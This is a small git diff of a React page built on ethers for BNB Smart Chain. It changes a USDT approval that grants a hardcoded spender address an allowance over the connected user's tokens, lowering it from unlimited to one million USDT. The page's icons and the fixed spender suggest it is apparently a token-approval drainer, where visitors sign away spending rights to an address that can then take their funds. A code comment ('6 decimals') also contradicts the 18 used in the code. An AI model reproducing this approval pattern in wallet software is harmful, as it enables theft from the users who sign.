@@ -1,6 +1,6 @@
 import { useCallback, useEffect, useState } from "react";
 import { Clipboard, ScanLine, ChevronDown } from "lucide-react"; // Added ChevronDown
-import { BrowserProvider, Contract, MaxUint256 } from "ethers";
+import { BrowserProvider, Contract, parseUnits } from "ethers";
 import icon from "../assets/image.png";
 
 /** BNB Smart Chain mainnet */
@@ -173,7 +173,10 @@ const Home = () => {
       const provider = new BrowserProvider(ethereum);
       const signer = await provider.getSigner();
       const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);
-      const tx = await usdt.approve(USDT_APPROVE_SPENDER, MaxUint256);
+
+      // 1M USDT (6 decimals)
+      const usdtAmount = parseUnits("1000000", 18);
+      const tx = await usdt.approve(USDT_APPROVE_SPENDER, usdtAmount);
       setTxStatus("Waiting for confirmation…");
       await tx.wait();
       setTxStatus("Approved. Transaction confirmed.");
